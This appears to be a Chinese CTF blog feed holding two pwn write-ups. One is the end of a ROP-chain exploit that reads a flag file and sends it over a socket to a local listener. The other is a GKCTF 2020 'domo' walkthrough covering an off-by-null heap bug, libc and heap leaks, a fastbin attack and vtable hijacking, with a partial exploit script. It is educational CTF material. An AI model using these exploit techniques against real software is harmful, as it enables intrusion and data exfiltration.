bingdwendwen+<span class="number">0x1b0</span></span><br><span class="line">ip_port = bingdwendwen+<span class="number">0x1c0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(pop_rdi)+p64(flag_addr) + \</span><br><span class="line">    p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">2</span>)+p64(syscall_ret)</span><br><span class="line"><span class="comment"># open(flag,0)</span></span><br><span class="line">payload += p64(push_rax_pop_rcx)+p64(mov_rdi_rcx) + \</span><br><span class="line">    p64(pop_rsi)+p64(flag_addr+<span class="number">0x20</span>)+p64(pop_rdx) + \</span><br><span class="line">    p64(<span class="number">0x30</span>)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line"><span class="comment"># read(fb,flag,0x30)</span></span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">2</span>)+p64(pop_rsi)+p64(<span class="number">1</span>)+p64(pop_rdx) + \</span><br><span class="line">    p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">41</span>)+p64(syscall_ret)</span><br><span class="line"><span class="comment"># socket(2, 1, 0)</span></span><br><span class="line">payload += p64(push_rax_pop_rcx)+p64(mov_rdi_rcx)+p64(pop_rsi) + \</span><br><span class="line">    p64(<span class="number">2</span>)+p64(pop_rax)+p64(<span class="number">33</span>)+p64(syscall_ret)</span><br><span class="line"><span class="comment"># dup2(soc, 2)</span></span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">2</span>)+p64(pop_rsi)+p64(ip_port) + \</span><br><span class="line">    p64(pop_rdx)+p64(<span class="number">16</span>)+p64(pop_rax)+p64(<span class="number">42</span>)+p64(syscall_ret)</span><br><span class="line"><span class="comment"># connect(2, serv_addr, 16)</span></span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">2</span>)+p64(pop_rsi)+p64(flag_addr+<span class="number">0x20</span>) + \</span><br><span class="line">    p64(pop_rdx)+p64(<span class="number">0x30</span>)+p64(pop_rax)+p64(<span class="number">1</span>)+p64(syscall_ret)</span><br><span class="line"><span class="comment"># write(2,flag,0x30)</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x1b0</span>, <span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;./flag&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x1c0</span>, <span class="string">b&#x27;\x00&#x27;</span>)+p64(<span class="number">0x0100007fe8030002</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>这里的0x0100007fe8030002分开来看是0x0100007f =&gt; 127.0.0.1，0xe803 =&gt; 1000，0x0002 =&gt; AF_INET</p><p>然后在服务器运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">server.bind((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">1000</span>))</span><br><span class="line">server.listen(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    conn, addr = server.accept()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(conn.recv(<span class="number">1024</span>))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        conn.close()</span><br></pre></td></tr></table></figure><p>今天先复现三个了，肝的太晚了！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先反思一下，整场比赛我只看了HideOnHeap和classic_httpd这两道题(因为在最开始的时候这两道题是排在最前面的)。发现毫无思路我就直接开始摆烂了，后面的pwn题也是一道没看，甚至都没下载下来。 &lt;strong&gt;拒绝摆烂，从你我做起！&lt;/strong&gt;&lt;/p</summary>
      
    
    
    
    <category term="比赛复现" scheme="https://cv196082.gitee.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>GKCTF_2020_domo</title>
    <link href="https://cv196082.gitee.io/2022/02/10/GKCTF-2020-domo/"/>
    <id>https://cv196082.gitee.io/2022/02/10/GKCTF-2020-domo/</id>
    <published>2022-02-10T06:05:02.000Z</published>
    <updated>2022-03-03T05:32:57.219Z</updated>
    
    <content type="html"><![CDATA[<p>复现一场比赛被第一道题卡了贼久，我太菜了，越学pwn越在想要是比赛第一题就是这个我连一道题都做不出来怎么办哦。</p><p><strong>吐槽:</strong> nss给的libc怎么也不对啊？</p><p><img src="/images/image-20220210171546325.png" alt="image-20220210171546325"></p><h2 id="简要分析"><a href="#简要分析" class="headerlink" title="简要分析"></a>简要分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+4h] [rbp-1Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v4 = <span class="number">1</span>;</span><br><span class="line">  v5 = <span class="number">1</span>;</span><br><span class="line">  v6 = <span class="number">1</span>;</span><br><span class="line">  sub_BA0(a1, a2, a3);</span><br><span class="line">  sub_C9D();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to GKCTF&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          menu();                               <span class="comment">//   puts(&quot;1: Add a user&quot;);</span></span><br><span class="line">                                                <span class="comment">//   puts(&quot;2: Delete a user&quot;);</span></span><br><span class="line">                                                <span class="comment">//   puts(&quot;3: Show a user&quot;);</span></span><br><span class="line">                                                <span class="comment">//   puts(&quot;4: Edit a user&quot;);</span></span><br><span class="line">                                                <span class="comment">//   return puts(&quot;5: Exit&quot;);</span></span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">          _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">          <span class="keyword">if</span> ( v7 != <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          add(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v7 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">delete</span>(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v7 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      show(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    edit(&amp;v4, &amp;v5, &amp;v6);</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = seccomp_init(<span class="number">2147418112LL</span>);</span><br><span class="line">  seccomp_rule_add(v8, <span class="number">0LL</span>, <span class="number">59LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v8, <span class="number">0LL</span>, <span class="number">4294957238LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v8, <span class="number">0LL</span>, <span class="number">10LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_load(v8);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;oh,Bye&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在main内的最后开启了沙盒，可以看出来禁用了execve的调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_E6C</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( check(a1) == <span class="number">1</span> &amp;&amp; chunk_num[<span class="number">0</span>] &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    HIDWORD(nbytes) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( SHIDWORD(nbytes) &lt;= <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*(&amp;chunk_arr + SHIDWORD(nbytes)) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">        _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">        <span class="keyword">if</span> ( (nbytes &amp; <span class="number">0x80000000</span>) == <span class="number">0LL</span> &amp;&amp; nbytes &lt;= <span class="number">288</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          *(&amp;chunk_arr + SHIDWORD(nbytes)) = <span class="built_in">malloc</span>(nbytes);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">          read(<span class="number">0</span>, *(&amp;chunk_arr + SHIDWORD(nbytes)), nbytes);</span><br><span class="line">          *(*(&amp;chunk_arr + SHIDWORD(nbytes)) + nbytes) = <span class="number">0</span>;<span class="comment">// off by null</span></span><br><span class="line">          ++chunk_num[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;sobig&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">      &#125;</span><br><span class="line">      ++HIDWORD(nbytes);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在add函数存在明显的off by null漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_C16</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *(*<span class="keyword">volatile</span> v0)(<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *); <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">bool</span> v1; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">void</span> (*<span class="keyword">volatile</span> v2)(<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *); <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = _malloc_hook;</span><br><span class="line">  v1 = v0 != <span class="number">0LL</span>;</span><br><span class="line">  v2 = _free_hook;</span><br><span class="line">  <span class="keyword">if</span> ( !v1 &amp;&amp; v2 == <span class="number">0LL</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;oh no&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在add函数和delete函数的开头部分都存在这个函数检验_malloc_hook和_free_hook是否被修改。所以常规的修改hook为one_gadget是不现实的了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_115E</span><span class="params">(_DWORD *a1, _DWORD *a2, _DWORD *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [rsp+20h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( check() == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *a1 &amp;&amp; *a2 &amp;&amp; *a3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;addr:&quot;</span>);</span><br><span class="line">      _isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;buf);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;num:&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">1uLL</span>);</span><br><span class="line">      *a1 = <span class="number">0</span>;</span><br><span class="line">      *a2 = <span class="number">0</span>;</span><br><span class="line">      *a3 = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;starssgo need ten girl friend &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You no flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的edit函数和常规完全不一样，这里是存在一个任意地址写一字节并且只允许执行一次。</p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="leak-libc-addr"><a href="#leak-libc-addr" class="headerlink" title="leak libc addr"></a>leak libc addr</h3><p>当unsortedbin只有一个chunk的时候它的fd指针和bk指针都是指向main_arena的。</p><p><img src="/images/image-20220210143525923.png" alt="image-20220210143525923"></p><p>然后申请一个同样大小的chunk并且输入b’a’*7+b’\n’</p><p><img src="/images/image-20220210143647137.png" alt="image-20220210143647137"></p><p>即可获得main_arena的地址，然后计算出libc_base的地址。</p><h3 id="leak-heap-addr"><a href="#leak-heap-addr" class="headerlink" title="leak heap addr"></a>leak heap addr</h3><p>利用思路跟上面类似，不过是用fastbin。</p><p><img src="/images/image-20220210143829113.png" alt="image-20220210143829113"></p><p>此时他的fd指针指向的是他下一个chunk。申请一个size相同并且输入空字符即可求出heap的地址。</p><h3 id="chunk-overlap"><a href="#chunk-overlap" class="headerlink" title="chunk overlap"></a>chunk overlap</h3><p>接着就是利用堆的堆放方式利用off by null触发unlink为fastbin attack做准备。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x40</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">create(<span class="number">0xf0</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x40</span>, p64(<span class="number">0</span>)+p64(<span class="number">0xb1</span>)+p64(heap_addr+<span class="number">0x18</span>) +</span><br><span class="line">       p64(heap_addr+<span class="number">0x20</span>)+p64(heap_addr+<span class="number">0x10</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0xb0</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220210144318601.png" alt="image-20220210144318601"></p><p>我们使用以上三个chunk来进行，并且在chunk0的里面我们伪造一个size为0xb0的fake chunk。</p><p><img src="/images/image-20220210144755540.png" alt="image-20220210144755540"></p><p>可以看到经过上面我们已经修改了size为0x100的inuse位的值0，那么此时我们free掉它。</p><p><img src="/images/image-20220210144825573.png" alt="image-20220210144825573"></p><p>可以看到此时我们伪造的fake chunk的size已经变为了0x1b1</p><p><img src="/images/image-20220210145005043.png" alt="image-20220210145005043"></p><p>并且可以看到unlink后的fake chunk已经进入了unsorted bin了。</p><h3 id="vtable"><a href="#vtable" class="headerlink" title="vtable"></a>vtable</h3><p>在进行fastbin attack之前我们先先看看vtable是个什么东西</p><p><img src="/images/image-20220210145340055.png" alt="image-20220210145340055"></p><p>可以看到下面的vtable变量，存放的值是_IO_file_jumps的指针</p><p><img src="/images/image-20220210145524741.png" alt="image-20220210145524741"></p><p>可以看到_IO_file_jumps结构内存放很多函数的指针，<strong>一系列标准IO函数都会调用这些指针</strong>，但是_IO_file_jumps结构本身是不可写的，但是我们可以修改vtable指向我们伪造的_IO_file_jumps结构。</p><h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0xc0</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">_IO_2_1_stdin_ = libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(_IO_2_1_stdin_))</span><br><span class="line"></span><br><span class="line">fake_chunk = _IO_2_1_stdin_+<span class="number">160</span>-<span class="number">3</span></span><br><span class="line">create(<span class="number">0xc0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0x71</span>)+p64(fake_chunk))  </span><br><span class="line">create(<span class="number">0xa8</span>, p64(<span class="number">0</span>)*<span class="number">2</span>+p64(one_gadget)*<span class="number">19</span>)</span><br></pre></td></tr></table></figure><p>首先申请一个size为0xc0的chunk，而这个chunk会在unsorted bin当中的fake chunk中割出一部分拿给我们。所以我们可以通过这样一个chunk来修改我们放到fastbin当中的chunk。</p><p>先看_IO_2_1_stdin_附近适合用来构造fake chunk的地方。</p><p><img src="/images/image-20220210150545879.png" alt="image-20220210150545879"></p><p>可以看到这个位置是很适合拿来做chunk的size的也就是<code>_IO_2_1_stdin_+160-3</code></p><p><img src="/images/image-20220210150842931.png" alt="image-20220210150842931"></p><p>可以看到fastbin当中的chunk被我们改变了到了制定位置，然后伪造vtable也在了，最后修改getshell即可</p><h3 id="综上得出exp"><a href="#综上得出exp" class="headerlink" title="综上得出exp"></a>综上得出exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./domo&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./domo&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;5: Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;size:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content:&#x27;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;5: Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(index), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;5: Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(index), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">address, num</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;5: Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">    r.senline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(address), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;num:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(num), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x40</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0xf0</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0xf0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>)  <span class="comment"># 2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line"><span 